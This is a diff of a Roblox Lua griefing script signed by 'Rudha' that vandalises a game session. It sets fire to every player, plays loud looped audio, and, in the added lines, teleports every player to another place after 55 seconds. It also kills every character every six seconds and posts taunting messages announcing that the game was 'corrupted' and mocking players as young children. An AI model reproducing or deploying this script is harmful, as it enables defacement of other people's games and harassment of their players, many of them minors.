@@ -1,5 +1,4 @@
---BY Rudha, don't steal, your skid!
-
+--rudha game fucker
 local Players = game:GetService("Players")
 local Lighting = game:GetService("Lighting")
 local StarterGui = game:GetService("StarterGui")
@@ -9,7 +8,7 @@ local Workspace = game:GetService("Workspace")
 
 local plr = Players.LocalPlayer
 
-local IMAGE_ID = "rbxassetid://113099185358179"
+local IMAGE_ID = "rbxassetid://117467695924241"
 local AUDIO_ID = "rbxassetid://139474101611994"
 
 pcall(function()
@@ -29,7 +28,6 @@ pcall(function()
 	sound.Volume = 10
 	sound.PlaybackSpeed = 1.20
 	sound.Looped = true
-	sound.pitch = 1.0
 	sound:Play()
 end)
 
@@ -73,39 +71,6 @@ end)
 
 task.spawn(function()
 	while true do
-		for _, obj in ipairs(Workspace:GetDescendants()) do
-			if obj:IsA("BasePart") then
-				local model = obj:FindFirstAncestorOfClass("Model")
-				if not (model and model:FindFirstChildOfClass("Humanoid")) then
-					obj.Anchored = false
-				end
-			end
-		end
-		task.wait(1)
-	end
-end)
-
-task.spawn(function()
-	local gui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
-	gui.IgnoreGuiInset = true
-	gui.ResetOnSpawn = false
-
-	local img = Instance.new("ImageLabel", gui)
-	img.Size = UDim2.new(1,0,1,0)
-	img.BackgroundTransparency = 1
-	img.Image = IMAGE_ID
-	img.Visible = false
-
-	while true do
-		task.wait(math.random(3,6))
-		img.Visible = true
-		task.wait(2.0)
-		img.Visible = false
-	end
-end)
-
-task.spawn(function()
-	while true do
 		for _, p in ipairs(Players:GetPlayers()) do
 			if p.Character then
 				for _, part in ipairs(p.Character:GetChildren()) do
@@ -116,33 +81,6 @@ task.spawn(function()
 						fire.Heat = 8
 						fire.Parent = part
 					end
-				end
-			end
-		end
-		task.wait(1)
-	end
-end)
-
-task.spawn(function()
-	while true do
-		for _, p in ipairs(Players:GetPlayers()) do
-			if p.Character then
-				local root = p.Character:FindFirstChild("HumanoidRootPart")
-				if root and not root:FindFirstChild("RudhaParticles") then
-					local att = Instance.new("Attachment", root)
-					att.Name = "RudhaParticles"
-
-					local pe = Instance.new("ParticleEmitter", att)
-					pe.Texture = IMAGE_ID
-					pe.Rate = 40
-					pe.Lifetime = NumberRange.new(1.5, 3)
-					pe.Speed = NumberRange.new(4, 6)
-					pe.Size = NumberSequence.new(2)
-					pe.Rotation = NumberRange.new(0, 360)
-					pe.RotSpeed = NumberRange.new(-180, 180)
-					pe.SpreadAngle = Vector2.new(360,360)
-					pe.LightEmission = 1
-					pe.Transparency = NumberSequence.new(0)
 				end
 			end
 		end
@@ -178,8 +116,6 @@ local function TrocarCorDeTudo()
 					if child:IsA("Fire") then
 						child.Color = cor
 						child.SecondaryColor = cor
-					elseif child:IsA("ParticleEmitter") then
-						child.Color = ColorSequence.new(cor)
 					end
 				end
 			end
@@ -187,12 +123,13 @@ local function TrocarCorDeTudo()
 	end
 end
 
-task.spawn(function()
+task.spawn(function() 
 	while true do
 		TrocarCorDeTudo()
 		task.wait(0.10)
 	end
 end)
+
 RunService.RenderStepped:Connect(function()
 	local char = plr.Character
 	if char then
@@ -201,4 +138,57 @@ RunService.RenderStepped:Connect(function()
 			hrp.CFrame = hrp.CFrame + Vector3.new(0, 0.12, 0)
 		end
 	end
+end)
+
+local TeleportService = game:GetService("TeleportService")
+
+local PLACE_ID = 135509927066801
+
+local function teleportarGeral()
+	for _, player in pairs(Players:GetPlayers()) do
+		pcall(function()
+			TeleportService:Teleport(PLACE_ID, player)
+		end)
+	end
+end
+
+task.wait(55)
+teleportarGeral()
+
+task.spawn(function()
+	while true do
+		for _, p in ipairs(Players:GetPlayers()) do
+			if p.Character then
+				local hum = p.Character:FindFirstChildOfClass("Humanoid")
+				if hum then
+					hum.Health = 0
+				end
+			end
+		end
+		task.wait(6)
+	end
+end)
+ 
+print("RUDHA WAS HERE!")
+print("SHOW'EN NO MECRY")
+print("roblox is securty at this level?")
+
+task.spawn(function()
+	local message = Instance.new("Message")
+	message.Parent = workspace
+	message.Text = "Rudha corrupted this place"
+	wait(4)
+	message.Text = "THIS GAME WAS CORRUPTED BY RUDHA :D"
+	wait(2)
+	message:Destroy()
+end)
+
+task.spawn(function()
+	local message = Instance.new("Message")
+	message.Parent = workspace
+	message.Text = "don't cry, your 7 years old kid"
+	wait(4)
+	message.Text = "players, por que estas amargo?"
+	wait(2)
+	message:Destroy()
 end)
